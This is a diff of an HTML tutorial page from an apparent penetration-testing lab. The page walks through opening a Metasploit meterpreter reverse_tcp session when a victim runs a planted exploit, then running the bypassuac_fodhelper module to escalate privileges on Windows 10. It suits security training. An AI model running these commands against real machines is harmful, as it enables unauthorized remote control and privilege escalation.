@@ -2,7 +2,8 @@
   <a href=../index.html>Back to home</a>
 <hr/>
   <h2>Remote Shell Workflow</h2>
-<p>Follow the remote shell workflow to create an exploit and store it in /var/www/html/share</p>
+<p>Follow the <a href=remote_shell_workflow1.html>remote shell workflow</a> to create an exploit and store it in /var/www/html/share</p>
+<p>Instead of using Listener port 4444, use 444 now !</p>
 <p>Run msfconsole; use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost [KALI IP]; set lport 444; run</p>
 <p>As soon as the victim downloads and opens the exploit, a meterpreter session will open</p>
 <p><ol>
@@ -15,12 +16,19 @@
  <ul>sessions -i* -> show active background sessions</ul>
  <ul>sessions -i 1 -> return to the first background session</ul>
 </ol>
-<p>The meterpreter session is running on the background. Now, type search bypassuac to get the list of bypassuac modules. We wil bypass Windows UAC 
-  protection via the FodHelper Registry Key, which is present in Metasploit as bypassuac_fodhelper exploit.</p>
+<p>The meterpreter session is running on the background. Now, type <b>search bypassuac</b> to get the list of bypassuac modules. We wil bypass Windows UAC 
+  protection via the FodHelper Registry Key, which is present in Metasploit as <b>bypassuac_fodhelper</b> exploit.</p>
+<p>This module will bypass Windows 10 UAC by hijacking a special key in the Registry under the current user hive, and inserting a custom command that will get 
+ invoked when the Windows fodhelper.exe application is launched. It will spawn a second shell that has the UAC flag turned off. This module modifies a registry key, 
+ but cleans up the key once the payload has been invoked. The module does not require the architecture of the payload to match the OS. If specifying EXE::Custom 
+ your DLL should call ExitProcess() after starting your payload in a separate process.</p>
 <p><ol>
   <ul>use exploit/windows/local/bypassuac_fodhelper</ul>
   <ul>set session 1</ul>
-  <ul>show options; set lhost 10.10.1.13; set target 0; exploit</ul>
+  <ul>show options</ul>
+ <ul>set lhost 10.10.1.13</ul>
+ <ul>set target 0</ul>
+ <ul>exploit</ul>
 </ol></p>
 <p>The BypassUAC exploit will bypass the UAC setting on the Windows machine.</p>
 <p><ol>
